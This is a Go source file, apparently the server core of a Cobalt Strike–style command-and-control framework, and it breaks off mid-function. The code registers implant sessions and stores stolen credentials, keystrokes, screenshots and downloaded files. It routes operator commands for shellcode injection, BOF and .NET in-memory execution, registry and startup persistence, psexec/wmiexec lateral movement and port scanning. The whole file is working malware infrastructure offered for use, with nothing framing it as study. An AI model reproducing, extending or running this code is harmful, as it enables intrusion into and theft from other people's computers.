// csdev :: v2_core.go  --  协议 v2 服务端核心
//
// 实现 docs/protocol_v2.md:
//   - /submit 统一入口 (上行携带结果 + 下行携带任务批次)
//   - RSA-2048 checkin 交换每会话 AES/HMAC 密钥
//   - TLV 上行处理: RESULT / FILE_CHUNK / HEARTBEAT / CREDENTIAL / KEYLOG / SCREEN
//   - 命令类别路由: 原生类别 (ps/fs/file/token/proxy...) 与 shell 别名映射
//   - 分块下载重组 / 分块上传下发
//
// v1 (KBRK/RC4) 作为 legacy listener 与 v2 并存, 二者共用 /api 接口。
package main

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"strconv"
	"strings"
	"sync"
	"time"

	"csdev/proto"
)

// ---------------------------------------------------------------- 常量
// 与 docs/protocol_v2.md 第 3、4 节一致。此处本地定义, 避免与 proto 包耦合过深。
const (
	tlvHeartbeat  = 0x1001
	tlvResult     = 0x1002
	tlvFileChunk  = 0x1003
	tlvProxyData  = 0x1004
	tlvKeylog     = 0x1005
	tlvScreen     = 0x1006
	tlvMetaUpdate = 0x1007
	tlvCredential = 0x1008

	tlvTask      = 0x2001
	tlvChunkAck  = 0x2002
	tlvProxyDown = 0x2003
	tlvSetSleep  = 0x2004
	tlvKill      = 0x2005

	cmdExecShell   = 0x01
	cmdFileDL      = 0x02
	cmdFileUP      = 0x03
	cmdProcList    = 0x04
	cmdExit        = 0x05
	cmdSetSleep    = 0x06
	cmdInjProc     = 0x07
	cmdInjBOF      = 0x08
	cmdInjAssembly = 0x09
	cmdToken       = 0x0A
	cmdProxy       = 0x0B
	cmdKeylog      = 0x0C
	cmdScreenshot  = 0x0D
	cmdPersist     = 0x0E
	cmdPSList      = 0x0F
	cmdFSOps       = 0x10
	cmdNetOps      = 0x11
	cmdPortscan    = 0x12
	cmdRPortfwd    = 0x13

	stOK      = 0
	stErr     = 1
	stPartial = 2
	stBusy    = 3

	chunkSize = 512 * 1024
)

// ---------------------------------------------------------------- 会话

type V2Session struct {
	ID   string // "B001" 形式, 与 v1 的 "S001" 区分
	Num  uint32 // 线上 session_id
	Impl string

	Host   string
	User   string
	Arch   string
	Proc   string
	OSVer  string
	PID    uint32
	PPID   uint32
	Addr   string
	First  int64
	Last   int64

	AESKey  []byte
	HMACKey []byte
	RXSeq   uint32 // 已接受的最大上行 seq
	TXSeq   uint32 // 下行序号

	SleepMS uint32
	Jitter  uint8

	mu      sync.Mutex
	Queue   []*proto.Task
	NextID  uint32
	Outputs []Output
	inFlight map[uint32]time.Time

	// 下载重组状态
	dlActive bool
	dlJob    uint32
	dlPath   string
	dlNames  map[uint32]string // job -> 远端路径文件名
	dlData   []byte
	dlRecv   uint32
	dlTotal  uint32
	dlErr    string

	// 上传状态
	upActive bool

	// hashdump 编排状态 (见 v2_hashdump.go)。用独立的锁, 不和 mu 嵌套。
	hdMu  sync.Mutex
	hdRun *hashdumpRun

	// checkin: 临时把 sleep 压到最小以催一次心跳, 下次收到上行后恢复原值。
	// 对标 CS 的 checkin 命令 —— 用于"等一个任务结果"或"确认目标还在线"。
	checkinSaved uint32
	checkinPend  bool
}

type V2State struct {
	mu    sync.RWMutex
	byID  map[string]*V2Session
	byNum map[uint32]*V2Session
	seq   uint32
}

var v2st = &V2State{byID: map[string]*V2Session{}, byNum: map[uint32]*V2Session{}}

func (s *V2Session) pushOut(text string) {
	s.mu.Lock()
	s.Outputs = append(s.Outputs, Output{TS: time.Now().UnixNano(), Text: base64.StdEncoding.EncodeToString([]byte(text))})
	if len(s.Outputs) > 20000 {
		s.Outputs = s.Outputs[len(s.Outputs)-10000:]
	}
	s.mu.Unlock()
}

// pushOutRaw 直传原始字节的 base64。
// **命令结果必须走这条路径**: 植入体输出是 GBK/ANSI 字节, 先转成 string 会把
// 非 UTF-8 字节替换成 U+FFFD 且不可逆 (中文文件名/中文进程名会永久变成乱码方块)。
// 客户端本来就按"先严格 UTF-8, 失败退 GBK"解码 base64, 那里才是正确的解码点。
func (s *V2Session) pushOutRaw(b []byte) {
	s.mu.Lock()
	s.Outputs = append(s.Outputs, Output{TS: time.Now().UnixNano(), Text: base64.StdEncoding.EncodeToString(b)})
	if len(s.Outputs) > 20000 {
		s.Outputs = s.Outputs[len(s.Outputs)-10000:]
	}
	s.mu.Unlock()
}

func (s *V2Session) drain(since int64) []Output {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := []Output{}
	for _, o := range s.Outputs {
		if o.TS >= since {
			out = append(out, o)
		}
	}
	return out
}

// 入队一个任务
func (s *V2Session) enqueue(class byte, alias string, arg []byte) uint32 {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.NextID++
	id := s.NextID
	s.Queue = append(s.Queue, &proto.Task{ID: id, Class: class, Alias: alias, Arg: arg})
	if s.inFlight == nil {
		s.inFlight = map[uint32]time.Time{}
	}
	s.inFlight[id] = time.Now()
	return id
}

// 下发前登记 job -> 文件名, 供 FILE_CHUNK 重组时命名
func (s *V2Session) noteDownloadNames(tasks []*proto.Task) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.dlNames == nil {
		s.dlNames = map[uint32]string{}
	}
	for _, t := range tasks {
		switch t.Class {
		case cmdFileDL:
			s.dlNames[t.ID] = string(t.Arg)
		case cmdScreenshot:
			// 不带后缀: 植入体优先 JPEG, GDI+ 不可用时回退 BMP,
			// 落盘时按内容魔数决定扩展名 (见 v2SaveDownload)
			s.dlNames[t.ID] = fmt.Sprintf("screen_%d", t.ID)
		}
	}
}

// 取走全部待发任务
func (s *V2Session) takeQueue() []*proto.Task {
	s.mu.Lock()
	defer s.mu.Unlock()
	q := s.Queue
	s.Queue = nil
	return q
}

func (st *V2State) lookup(id string) *V2Session {
	st.mu.RLock()
	defer st.mu.RUnlock()
	return st.byID[id]
}

func (st *V2State) lookupNum(id uint32) *V2Session {
	st.mu.RLock()
	defer st.mu.RUnlock()
	return st.byNum[id]
}

func (st *V2State) list() []*V2Session {
	st.mu.RLock()
	defer st.mu.RUnlock()
	out := make([]*V2Session, 0, len(st.byID))
	for _, v := range st.byID {
		out = append(out, v)
	}
	return out
}

func (st *V2State) getOrCreate(addr string, info *proto.CheckinInfo) *V2Session {
	meta := info.Meta
	get := func(i int, def string) string {
		if i < len(meta) && meta[i] != "" {
			return meta[i]
		}
		return def
	}
	atoi := func(s string) uint32 {
		v, _ := strconv.ParseUint(s, 10, 32)
		return uint32(v)
	}

	st.mu.Lock()
	defer st.mu.Unlock()

	// 每次 checkin 都新建会话, 不做 host|user 去重。
	//
	// 之前这里按 host|user 复用会话号, 意图是"同一台机器重连时沿用原会话"。但这有两个
	// 致命问题:
	//   1) 同一 payload 并发跑多份时, 各实例 host|user 相同 -> 互相覆盖 AES/HMAC 密钥,
	//      表现就是"HMAC 校验失败", 且两侧 seq 互相打架 -> "seq 回退"。
	//   2) 即便真的重启重连, 新进程 seq 从 0 起, 而会话 RXSeq 还停在旧值 -> 同样 seq 回退。
	// 每个 checkin 都携带全新的随机 (aes_key||hmac_key), 本质就是一个新会话, 直接给新号即可。
	// (若将来需要"重启沿用旧号", 应引入 per-process boot_id + 会话超时判定, 而不是靠 host|user。)

	st.seq++
	sess := &V2Session{
		ID:      fmt.Sprintf("B%03d", st.seq),
		Num:     st.seq,
		Impl:    "v2",
		Host:    get(0, "?"),
		User:    get(1, "?"),
		Arch:    get(2, "x64"),
		PID:     atoi(get(3, "0")),
		PPID:    atoi(get(4, "0")),
		Proc:    get(5, "?"),
		OSVer:   get(7, "?"),
		Addr:    addr,
		First:   time.Now().Unix(),
		Last:    time.Now().Unix(),
		AESKey:  info.AESKey,
		HMACKey: info.HMACKey,
		// meta 第 9/10 字段: 植入体编译期的 sleep / jitter (新植入体才上报)。
		// 以前这里硬编码 5000/10, 而 meta 里根本没有这两个值 —— 于是 GUI 显示的
		// sleep 永远与实际配置无关, 操作员会把它当成"延迟来源"来排查, 白费功夫。
		// 老植入体不带这两个字段时 get() 回落默认值, 与历史行为一致。
		SleepMS: atoi(get(8, "5000")),
		Jitter:  uint8(atoi(get(9, "10"))),
		inFlight: map[uint32]time.Time{},
		dlNames:  map[uint32]string{},
	}
	st.byID[sess.ID] = sess
	st.byNum[sess.Num] = sess

	logf("[+] 新会话(v2) %s  %s\\%s  %s pid=%d ppid=%d os=%s addr=%s",
		sess.ID, sess.Host, sess.User, sess.Proc, sess.PID, sess.PPID, sess.OSVer, addr)
	// 会话主机自动登记进目标库 (GUI 的 Targets 视图)
	targetUpsert(sess.Host, "", sess.OSVer, "beacon", sess.ID, "")
	sess.pushOut(fmt.Sprintf("[*] 会话建立  %s\\%s  %s  pid=%d  os=%s",
		sess.Host, sess.User, sess.Proc, sess.PID, sess.OSVer))
	eventLog("beacon", sess.ID, "上线", sess.User+"@"+sess.Host+" "+sess.Proc)
	return sess
}

func (s *V2Session) LastAddr(a string) { s.Addr = a }

// ---------------------------------------------------------------- 帧应答

func putBE32(b []byte, v uint32) { binary.BigEndian.PutUint32(b, v) }

// 构造下行帧: 批次明文 -> AES/HMAC 加密
func v2SealResponse(sess *V2Session, plain []byte) ([]byte, error) {
	ctLen := (len(plain)/16 + 1) * 16
	bodyLen := 16 + ctLen + 32

	hdr := make([]byte, 20)
	putBE32(hdr[0:], proto.Magic)
	putBE32(hdr[4:], sess.Num)
	sess.mu.Lock()
	putBE32(hdr[8:], sess.TXSeq)
	sess.TXSeq++
	sess.mu.Unlock()
	putBE32(hdr[12:], 0)
	putBE32(hdr[16:], uint32(bodyLen))

	body, err := proto.SealBody(sess.AESKey, sess.HMACKey, hdr, plain)
	if err != nil {
		return nil, err
	}
	return append(hdr, body...), nil
}

// 空批次
func emptyBatch() []byte { return []byte{0, 0, 0, 0} }

// 组装任务批次明文
func buildBatch(tasks []*proto.Task) []byte {
	b := &proto.Batch{}
	for _, t := range tasks {
		b.Tasks = append(b.Tasks, *t)
	}
	return b.Encode()
}

// ---------------------------------------------------------------- 上行处理

func v2HandleResult(sess *V2Session, d []byte) {
	var r proto.Result
	if err := r.Decode(d); err != nil {
		return
	}
	sess.mu.Lock()
	delete(sess.inFlight, r.TaskID)
	sess.mu.Unlock()

	// open 任务回执关联 (代理通道在拿到回执后才回 SOCKS success)
	ProxyResult(sess, r.TaskID, r.Out)

	// 后台作业收尾: 一次性任务(端口扫描等)的结果回来即结束
	bgJobFinishTask(sess.ID, r.TaskID, r.Status == proto.StatusOK)

	text := string(r.Out)
	sess.pushOutRaw(ensureUTF8(r.Out))
	eventLog("beacon", sess.ID, "结果", fmt.Sprintf("task#%d %d 字节", r.TaskID, len(r.Out)))
	_ = text
}

/* ensureUTF8 把中文 Windows 的 GBK/GB18030 输出转成 UTF-8。
 *
 * 起因: 中文系统上 `whoami` / `systeminfo` 之类命令的输出是 GBK 编码,
 * 直接按 UTF-8 存/显示会变成一片 U+FFFD(GUI 里就是乱码)。这里的输出通道
 * 只承载文本结果(二进制走 TLV 分块通道), 所以可以安全地做一次猜测性转码:
 *   - 合法 UTF-8 原样返回(绝大多数英文输出与二进制片段)
 *   - 否则按 GB18030 解码; 解码失败仍返回原字节, 不丢数据
 */
func ensureUTF8(b []byte) []byte {
	if len(b) == 0 || utf8.Valid(b) {
		return b
	}
	out, err := simplifiedchinese.GB18030.NewDecoder().Bytes(b)
	if err != nil || len(out) == 0 {
		return b
	}
	return out
}

func v2HandleChunk(sess *V2Session, d []byte) {
	if len(d) < 12 {
		return
	}
	job := binary.BigEndian.Uint32(d[0:4])
	off := binary.BigEndian.Uint32(d[4:8])
	total := binary.BigEndian.Uint32(d[8:12])
	data := d[12:]

	sess.mu.Lock()
	if !sess.dlActive || sess.dlJob != job {
		sess.dlActive = true
		sess.dlJob = job
		if sess.dlNames == nil {
			sess.dlNames = map[uint32]string{}
		}
		if nm, ok := sess.dlNames[job]; ok {
			sess.dlPath = nm
		} else {
			sess.dlPath = fmt.Sprintf("job%d.bin", job)
		}
		sess.dlData = make([]byte, 0, total)
		sess.dlRecv = 0
		sess.dlTotal = total
	}
	if off == sess.dlRecv || off == uint32(len(sess.dlData)) {
		sess.dlData = append(sess.dlData, data...)
	} else if off <= uint32(len(sess.dlData)) {
		// 重传块: 忽略
	} else {
		sess.dlErr = fmt.Sprintf("分块乱序: 期望 %d 收到 %d", len(sess.dlData), off)
	}
	sess.dlRecv = uint32(len(sess.dlData))
	done := sess.dlRecv >= sess.dlTotal && sess.dlTotal > 0
	path := sess.dlPath
	buf := sess.dlData
	if done {
		sess.dlActive = false
		sess.dlData = nil
	}
	sess.mu.Unlock()

	if done {
		v2SaveDownload(sess, path, buf)
		// hashdump 的 hive 走同一条通道回来, 到齐后离线解析 (见 v2_hashdump.go)
		hashdumpOnDownload(sess, path, buf)
	}
}

// looksLikeImage 按魔数判断内容是否为图片。
// 用途: 截图流的帧由植入体自分配 job id, 服务端没有对应的路径登记,
// 只能靠内容判断 (见 v2SaveDownload)。
func looksLikeImage(b []byte) bool {
	if len(b) < 4 {
		return false
	}
	if b[0] == 0xFF && b[1] == 0xD8 {
		return true // JPEG
	}
	if b[0] == 'B' && b[1] == 'M' {
		return true // BMP
	}
	if b[0] == 0x89 && b[1] == 'P' && b[2] == 'N' && b[3] == 'G' {
		return true // PNG
	}
	return false
}

func v2SaveDownload(sess *V2Session, remotePath string, data []byte) {	if err := os.MkdirAll(downloadDir, 0o755); err != nil {
		return
	}
	name := filepath.Base(strings.ReplaceAll(remotePath, "\\", "/"))
	if name == "." || name == "" {
		name = fmt.Sprintf("job%d", sess.dlJob)
	}
	// 截屏按内容魔数定扩展名: 植入体优先 JPEG (体积约为 BMP 的 1/20),
	// GDI+ 不可用时回退 BMP。服务端不该假设是哪一种。
	// screen_ = 单次截屏, stream_ = 连续截图流的帧, 两者都进截屏库。
	isShot := strings.HasPrefix(name, "screen_") || strings.HasPrefix(name, "stream_")
	// 截图流的帧由植入体自分配 job id (shotstream.c 的 0x70000000 段), 服务端
	// 不认识 → 落到默认名 job<N>.bin。这类"未知 job + 内容是图片"的下载就是流帧。
	if !isShot && strings.HasPrefix(name, "job") && looksLikeImage(data) {
		isShot = true
		name = fmt.Sprintf("stream_%d", sess.dlJob)
	}
	if isShot {
		ext := ".bin"
		if len(data) > 2 && data[0] == 0xFF && data[1] == 0xD8 {
			ext = ".jpg"
		} else if len(data) > 2 && data[0] == 'B' && data[1] == 'M' {
			ext = ".bmp"
		}
		name = name + ext
	}
	dst := filepath.Join(downloadDir, fmt.Sprintf("%s_%s", sess.ID, name))
	if err := os.WriteFile(dst, data, 0o644); err != nil {
		logf("[!] 写盘失败: %v", err)
		return
	}
	storeAdd(Download{ID: nextStoreID("dl"), SID: sess.ID, Name: name,
		Path: dst, Size: int64(len(data)), TS: time.Now().Unix(),
		RemotePath: remotePath})
	logf("[<] %s 下载完成 %s -> %s (%d 字节)", sess.ID, remotePath, dst, len(data))
	sess.pushOut(fmt.Sprintf("[+] 文件已接收: %s  (%d 字节)\r\n", dst, len(data)))
	eventLog("beacon", sess.ID, "下载", fmt.Sprintf("%s (%d 字节)", remotePath, len(data)))

	// 截屏走同一分块通道, 以 screen_ / stream_ 前缀区分, 额外入截屏库
	if isShot {
		storeAdd(Screenshot{Kind: KindScreenshot, ID: nextStoreID("ss"),
			SID: sess.ID, Path: dst, Size: int64(len(data)), TS: time.Now().Unix()})
		sess.pushOut("[+] 截屏已接收: " + dst)
		eventLog("beacon", sess.ID, "截屏", fmt.Sprintf("%d 字节", len(data)))
	}
}

func v2HandleCredential(sess *V2Session, d []byte) {
	c, err := parseCredentialTLV(d)
	if err != nil {
		return
	}
	c.SID = sess.ID
	if c.TS == 0 {
		c.TS = time.Now().Unix()
	}
	storeAdd(c)
	logf("[+] %s 凭据: %s\\%s (%s)", sess.ID, c.User, c.Secret, c.Source)
	sess.pushOut(fmt.Sprintf("[+] 凭据: %s\\%s  [%s]\r\n", c.User, c.Secret, c.Source))
	eventLog("beacon", sess.ID, "凭据", c.User+"\\"+c.Secret)
}

// 处理一次完整上行
func v2HandleUpload(sess *V2Session, plain []byte) {
	tlvs, err := proto.ParseTLVs(plain)
	if err != nil || len(tlvs) == 0 {
		return
	}
	for _, t := range tlvs {
		switch t.Type {
		case tlvHeartbeat:
			// Last 已更新
		case tlvResult:
			v2HandleResult(sess, t.Data)
		case tlvProxyData:
			ProxyHandleUpstream(sess, t.Type, t.Data)
		case tlvFileChunk:
			v2HandleChunk(sess, t.Data)
		case tlvCredential:
			v2HandleCredential(sess, t.Data)
		case tlvKeylog:
			storeAdd(Keystroke{SID: sess.ID, Text: string(t.Data), TS: time.Now().Unix(), Source: sess.Host})
			sess.pushOut("[*] 键盘记录\n" + string(t.Data))
		case tlvScreen:
			name := fmt.Sprintf("%s_%d.jpg", sess.ID, time.Now().Unix())
			if err := os.MkdirAll(screenshotDir, 0o755); err == nil {
				p := filepath.Join(screenshotDir, name)
				_ = os.WriteFile(p, t.Data, 0o644)
				storeAdd(Screenshot{SID: sess.ID, Path: p, Size: int64(len(t.Data)), TS: time.Now().Unix()})
				sess.pushOut("[*] 截屏已接收: " + p)
			}
		case tlvMetaUpdate:
			parts := strings.Split(string(t.Data), "\x1f")
			if len(parts) > 1 {
				sess.User = parts[1]
			}
		}
	}
}

// ---------------------------------------------------------------- HTTP

type VPListener struct {
	Priv *rsa.PrivateKey
	Name string
	Addr string
}

// profileEncodeResp 对下行帧做 profile 正变换 (http-post/server/output 链)
func profileEncodeResp(resp []byte) []byte {
	if out, err := profileEncodeBody(resp); err == nil {
		return out
	}
	logf("[!] body 正变换失败, 按原样发送")
	return resp
}

// v2ProcessFrame 处理一个上行帧并返回待发送的应答帧 —— **传输无关**。
// HTTP listener 与 TCP listener 共用此核心; 返回 nil 表示应回空应答。
// profile body 变换已在本函数内完成 (上行逆变换 / 下行正变换)。
func v2ProcessFrame(raw []byte, addr string, priv *rsa.PrivateKey) []byte {
	// profile body 逆变换 (http-post/client/output 链)
	if out, err := profileDecodeBody(raw); err == nil {
		raw = out
	} else {
		logf("[!] body 逆变换失败: %v", err)
		return nil
	}
	if len(raw) < 20 {
		return nil
	}

	f, err := proto.ParseFrame(raw)
	if err != nil {
		return nil
	}

	// --- checkin ---
	if f.Flags&proto.F_CHECKIN != 0 {
		info, err := proto.ParseCheckin(priv, f.Body)
		if err != nil {
			logf("[!] checkin 解析失败: %v", err)
			return nil
		}
		sess := v2st.getOrCreate(addr, info)
		resp, err := v2SealResponse(sess, emptyBatch())
		if err != nil {
			return nil
		}
		return profileEncodeResp(resp)
	}

	// --- 常规帧 ---
	sess := v2st.lookupNum(f.SessionID)
	if sess == nil {
		return nil
	}

	// 防重放: 上行 seq 必须严格递增
	if f.Seq <= sess.RXSeq && sess.RXSeq != 0 {
		logf("[!] %s 上行 seq 回退 (%d <= %d), 丢弃", sess.ID, f.Seq, sess.RXSeq)
		return nil
	}
	sess.RXSeq = f.Seq
	sess.Last = time.Now().Unix()

	// 上一次 checkin 已经催到心跳: 恢复原 sleep 并下发
	sess.mu.Lock()
	if sess.checkinPend {
		sess.checkinPend = false
		sess.SleepMS = sess.checkinSaved
		arg := make([]byte, 5)
		binary.BigEndian.PutUint32(arg, sess.checkinSaved)
		arg[4] = sess.Jitter
		sess.mu.Unlock()
		sess.enqueue(cmdSetSleep, "sleep", arg)
		logf("[*] %s checkin 完成, sleep 恢复为 %d ms", sess.ID, sess.checkinSaved)
	} else {
		sess.mu.Unlock()
	}

	plain, err := proto.OpenBody(sess.AESKey, sess.HMACKey, f)
	if err != nil {
		logf("[!] %s 上行解密/HMAC 失败: %v", sess.ID, err)
		return nil
	}

	tlvs, perr := proto.ParseTLVs(plain)
	if perr != nil {
		logf("[!] %s 上行 TLV 解析失败 (%d 字节): %v", sess.ID, len(plain), perr)
	} else if len(tlvs) == 0 {
		logf("[!] %s 上行 TLV 为空 (%d 字节)", sess.ID, len(plain))
	}
	v2HandleUpload(sess, plain)

	// 代理下行数据入队 (必须在 takeQueue 之前, 否则本轮数据要等到下一轮)
	ProxyDrain(sess)

	tasks := sess.takeQueue()
	if len(tasks) > 0 {
		sess.noteDownloadNames(tasks)
	}
	var resp []byte
	if len(tasks) == 0 {
		resp, err = v2SealResponse(sess, emptyBatch())
	} else {
		resp, err = v2SealResponse(sess, buildBatch(tasks))
		logf("[>] %s 下发 %d 个任务", sess.ID, len(tasks))
	}
	if err != nil {
		return nil
	}
	return profileEncodeResp(resp)
}

// profile 标识头只记录一次, 避免每轮 beacon 刷屏
var gIDHeaderSeenMu sync.Mutex
var gIDHeaderSeen = map[string]bool{}

// POST /submit
func (l *VPListener) handleSubmit(w http.ResponseWriter, r *http.Request) {
	// profile 的 metadata/id 落点: 植入体按 C2_ID_HEADER 发送, 这里记录一次以便确认生效
	for _, hn := range []string{"X-Request-Id", "X-Trace", "X-Session", "X-Csdev-Id"} {
		if v := r.Header.Get(hn); v != "" {
			gIDHeaderSeenMu.Lock()
			seen := gIDHeaderSeen[hn]
			if !seen {
				gIDHeaderSeen[hn] = true
				logf("[*] profile 标识头生效: %s: %s", hn, v)
				eventLog("listener", "", "标识头", hn+"="+v)
			}
			gIDHeaderSeenMu.Unlock()
			break
		}
	}

	raw, _ := io.ReadAll(r.Body)
	resp := v2ProcessFrame(raw, r.RemoteAddr, l.Priv)
	if resp == nil {
		w.Write([]byte{})
		return
	}
	profileApplyServerHeaders(w)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(resp)
}

// ---------------------------------------------------------------- 命令路由

// bofPack 把命令行参数打包成 BOF 参数块。
// **大端**, 每参数 [4B 长度][数据] —— 与 CS common/Packer.java 的 addInt/addString 一致。
func bofPack(args []string) []byte {
	out := []byte{}
	for _, a := range args {
		switch {
		case strings.HasPrefix(a, "int:"):
			v, _ := strconv.ParseInt(strings.TrimPrefix(a, "int:"), 0, 64)
			b := make([]byte, 4)
			binary.BigEndian.PutUint32(b, uint32(int32(v)))
			out = append(out, b...)
		case strings.HasPrefix(a, "short:"):
			v, _ := strconv.ParseInt(strings.TrimPrefix(a, "short:"), 0, 64)
			b := make([]byte, 2)
			binary.BigEndian.PutUint16(b, uint16(int16(v)))
			out = append(out, b...)
		default:
			b := make([]byte, 4)
			binary.BigEndian.PutUint32(b, uint32(len(a)))
			out = append(out, b...)
			out = append(out, []byte(a)...)
		}
	}
	return out
}

// 把用户命令翻译成 (cmd_class, arg)。精确匹配原生命令, 其余走服务端别名映射。
func v2Route(cmd string) (byte, string, []byte) {
	c := strings.TrimSpace(cmd)
	if c == "" {
		return cmdExecShell, c, nil
	}
	parts := strings.SplitN(c, " ", 2)
	verb := strings.ToLower(parts[0])
	rest := ""
	if len(parts) > 1 {
		rest = strings.TrimSpace(parts[1])
	}

	fsArg := func(op byte) []byte {
		return append([]byte{op}, []byte(rest)...)
	}

	switch verb {
	case "ps":
		return cmdPSList, verb, nil
	case "tasklist":
		return cmdProcList, verb, nil
	case "pwd":
		return cmdFSOps, verb, fsArg(0x01)
	case "cd":
		return cmdFSOps, verb, fsArg(0x02)
	case "ls", "ll", "dir":
		return cmdFSOps, verb, fsArg(0x03)
	case "cat", "type":
		return cmdFSOps, verb, fsArg(0x06)
	case "rm", "del":
		return cmdFSOps, verb, fsArg(0x04)
	case "mkdir":
		return cmdFSOps, verb, fsArg(0x05)
	case "download":
		return cmdFileDL, verb, []byte(rest)
	case "sleep":
		{
			pp := strings.Fields(rest)
			ms := uint32(5000)
			j := uint8(10)
			if len(pp) > 0 {
				if v, err := strconv.Atoi(pp[0]); err == nil && v > 0 {
					ms = uint32(v)
				}
			}
			if len(pp) > 1 {
				if v, err := strconv.Atoi(pp[1]); err == nil && v >= 0 && v < 100 {
					j = uint8(v)
				}
			}
			arg := make([]byte, 5)
			binary.BigEndian.PutUint32(arg, ms)
			arg[4] = j
			return cmdSetSleep, verb, arg
		}
	case "exit":
		return cmdExit, verb, nil
	case "kill":
		// **不能与 exit 同义**: kill <pid> 是"结束目标进程", 与 exit 合并会让
		// 任何 kill 操作把植入体自己关掉 (GUI 的进程浏览器踩过)。
		// 走 shell 别名映射 -> taskkill /F /PID <pid>
		return cmdExecShell, verb, []byte(mapCommand(c))
	case "screenshot":
		// screenshot              单次
		// screenshot stream [ms]  启动连续截图流 (后台线程按间隔抓屏)
		// screenshot stop         停止截图流
		{
			f := strings.Fields(rest)
			if len(f) > 0 && strings.EqualFold(f[0], "stream") {
				ms := uint32(5000)
				if len(f) > 1 {
					if v, err := strconv.Atoi(f[1]); err == nil && v >= 1000 {
						ms = uint32(v)
					}
				}
				arg := make([]byte, 5)
				arg[0] = 1
				binary.BigEndian.PutUint32(arg[1:], ms)
				return cmdScreenshot, verb, arg
			}
			if len(f) > 0 && strings.EqualFold(f[0], "stop") {
				return cmdScreenshot, verb, []byte{2}
			}
			return cmdScreenshot, verb, nil
		}
	case "keylog":
		if strings.Contains(rest, "stop") {
			return cmdKeylog, verb, []byte{0}
		}
		return cmdKeylog, verb, []byte{1}
	case "persist":
		// persist <run-hkcu|run-hklm|startup|list|clean> [名字]
		{
			f := strings.Fields(rest)
			mode := byte(1)
			if len(f) > 0 {
				switch strings.ToLower(f[0]) {
				case "run-hkcu", "hkcu", "user", "1":
					mode = 1
				case "run-hklm", "hklm", "machine", "admin", "2":
					mode = 2
				case "startup", "3":
					mode = 3
				case "list", "ls", "7":
					mode = 7
				case "clean", "remove", "8":
					mode = 8
				default:
					mode = 1
				}
			}
			nm := ""
			if len(f) > 1 {
				nm = f[1]
			}
			arg := append([]byte{mode}, []byte(nm)...)
			return cmdPersist, verb, arg
		}
	case "execute-assembly", "execasm", "assembly":
		{
			// execute-assembly <本地 .NET 程序集> [参数...]
			// arg = [4B asmlen][4B argslen][4B stubblen][asm][args][stub]
			// 引导 stub 由服务端附带下发 (通用代码, 目标程序集全程走内存)
			f := strings.Fields(rest)
			if len(f) < 1 {
				return cmdInjAssembly, verb, nil
			}
			asm, err := os.ReadFile(f[0])
			if err != nil {
				logf("[!] 读取 .NET 程序集失败: %v", err)
				return cmdInjAssembly, verb, nil
			}
			stubPath := filepath.Join(devRoot, "build", "clr", "csdev_clr_stub.dll")
			stub, err := os.ReadFile(stubPath)
			if err != nil {
				logf("[!] 缺少 CLR 引导 stub: %s (先跑 tools/build_clr_stub.ps1)", stubPath)
				return cmdInjAssembly, verb, nil
			}
			argsText := strings.Join(f[1:], " ")
			arg := make([]byte, 0, 12+len(asm)+len(argsText)+len(stub))
			hdr := make([]byte, 12)
			binary.BigEndian.PutUint32(hdr, uint32(len(asm)))
			binary.BigEndian.PutUint32(hdr[4:], uint32(len(argsText)))
			binary.BigEndian.PutUint32(hdr[8:], uint32(len(stub)))
			arg = append(arg, hdr...)
			arg = append(arg, asm...)
			arg = append(arg, []byte(argsText)...)
			arg = append(arg, stub...)
			logf("[>] execute-assembly %s (%d 字节, %d 参数)", f[0], len(asm), len(f)-1)
			return cmdInjAssembly, verb, arg
		}
	case "psexec2", "psexec-native":
		// 原生实现: 走 SCM API (OpenSCManager/CreateService/StartService) 直接建服务,
		// 不调用 sc.exe —— 比别名层的 `psexec` 少一个子进程与一套命令行特征。
		// 语法: psexec2 <host> <cmd>
		return cmdNetOps, verb, []byte("psexec " + rest)
	case "wmiexec2", "wmiexec-native":
		/* 原生实现: IWbemLocator -> ConnectServer -> Win32_Process::Create (DCOM) +
		 * \\host\admin$\Temp 重定向读回, 不调用 wmic.exe。
		 * 命名沿用 psexec2/psexec 的约定: `wmiexec` 仍是别名层的 shell 组合老路径,
		 * 原生版走 wmiexec2。
		 * 语法: wmiexec2 [-u user] [-p pass] [-d domain] <host> <cmd> */
		return cmdNetOps, verb, []byte("wmiexec " + rest)
	case "token":
		return cmdToken, verb, []byte(rest)
	case "inject", "shinject":
		{
			f := strings.Fields(rest)
			if len(f) < 2 {
				return cmdInjProc, verb, nil
			}
			pid, _ := strconv.Atoi(f[0])
			sc, err := base64.StdEncoding.DecodeString(strings.Join(f[1:], ""))
			if err != nil || len(sc) == 0 {
				return cmdInjProc, verb, nil
			}
			arg := make([]byte, 4+len(sc))
			binary.BigEndian.PutUint32(arg, uint32(pid))
			copy(arg[4:], sc)
			return cmdInjProc, verb, arg
		}
	case "portscan":
		return cmdPortscan, verb, []byte(rest)
	case "bof":
		{
			// bof <本地 .o 路径> [参数...]
			// 参数语法: 裸字面量 = 字符串; int:123 = 4 字节整数; short:5 = 2 字节
			// 打包格式必须与 CS 一致 —— **大端**, 每参数 [4B 长度][数据]
			// (依据: CS 4.7 common/Packer.java 走 ByteBuffer 默认大端,
			//  且 BeaconDataInt 等消费端会做 swap_endianess)
			f := strings.Fields(rest)
			if len(f) < 1 {
				return cmdInjBOF, verb, nil
			}
			data, err := os.ReadFile(f[0])
			if err != nil {
				logf("[!] 读取 BOF 失败: %v", err)
				return cmdInjBOF, verb, nil
			}
			packed := bofPack(f[1:])
			arg := make([]byte, 0, len(data)+len(packed)+8)
			hdr := make([]byte, 8)
			binary.BigEndian.PutUint32(hdr, uint32(len(data)))
			binary.BigEndian.PutUint32(hdr[4:], uint32(len(packed)))
			arg = append(arg, hdr...)
			arg = append(arg, data...)
			arg = append(arg, packed...)
			logf("[>] BOF %s  %d 字节  %d 参数", f[0], len(data), len(f)-1)
			return cmdInjBOF, verb, arg
		}
	}

	// 其余 -> shell, 经服务端别名映射
	return cmdExecShell, verb, []byte(mapCommand(c))
}

// 下发命令 (v2)
func v2SendCommand(sess *V2Session, userCmd string) (string, error) {
	// hashdump 需要服务端编排 (导出 -> 回传 -> 离线解析三步), 不经过
	// v2Route 的单任务模型, 也不走 v1 别名层的 reg save + dir 老路径。
